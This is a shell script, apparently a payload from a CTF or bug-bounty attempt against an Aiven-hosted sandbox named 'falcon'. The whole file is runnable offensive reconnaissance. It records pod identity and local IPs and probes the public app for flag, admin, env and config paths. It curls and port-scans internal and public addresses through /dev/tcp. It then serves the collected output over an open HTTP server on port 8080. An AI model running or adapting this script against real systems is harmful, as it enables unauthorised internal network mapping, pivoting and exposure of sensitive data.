#!/bin/sh
# CTF falcon — fetch the PORT 80 app (from Aiven VPC) + probe internal
{
  echo "=== POD ==="
  id 2>&1
  echo "--- iface ---"
  cat /proc/net/fib_trie 2>/dev/null | grep -B1 "32 host" | grep -oE "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" | sort -u
  echo
  echo "=== falcon PORT 80 (HTTP app) — public FQDN ==="
  curl -s --max-time 15 -i http://falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com/ 2>&1 | head -60
  echo
  echo "=== falcon PORT 80 — common paths ==="
  for p in "" index.html flag /flag.txt /conn /info /admin /login /health /status /env /config /robots.txt; do
    code=$(curl -s -o /tmp/r.txt -w "%{http_code}" --max-time 8 "http://falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com/$p" 2>/dev/null)
    echo "GET /$p -> $code ($(wc -c < /tmp/r.txt) bytes) :: $(head -c 120 /tmp/r.txt | tr '\n' ' ')"
  done
  echo
  echo "=== internal 10.1.47.111:80 ==="
  curl -s --max-time 10 -i http://10.1.47.111/ 2>&1 | head -40
  echo
  echo "=== port 80 reachability (public + internal) ==="
  for hp in 132.145.163.127:80 132.145.163.127:443 10.1.47.111:80 10.1.47.111:12691; do
    h=${hp%:*}; p=${hp#*:}
    timeout 4 sh -c "cat < /dev/null > /dev/tcp/$h/$p" 2>/dev/null && echo "$hp OPEN"
  done
  echo "=== END ==="
} > /app/ctf.txt 2>&1
exec python3 -m http.server 8080 --directory /app
